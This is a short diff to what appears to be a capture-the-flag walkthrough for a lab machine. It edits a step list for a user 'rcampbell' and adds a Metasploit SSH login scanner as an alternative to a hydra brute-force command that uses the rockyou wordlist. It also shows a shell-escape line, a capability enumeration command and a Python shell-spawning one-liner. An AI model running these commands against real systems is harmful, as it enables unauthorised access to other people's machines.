@@ -12,8 +12,6 @@
 		8. CTRL+R, CTRL+X
 		9. `reset; sh 1>&0 2>&0`
 ### Rcampbell Path
-	1. `hydra ssh://$IP -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64`
+	1. `hydra ssh://$IP -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64` or `msfconsole` `use auxiliary/scanner/ssh/ssh_login`
 	2. `getcap -r / 2>/dev/null` *optional*
 	3. `python -c 'import os; os.system("/bin/sh")'`
-	
-
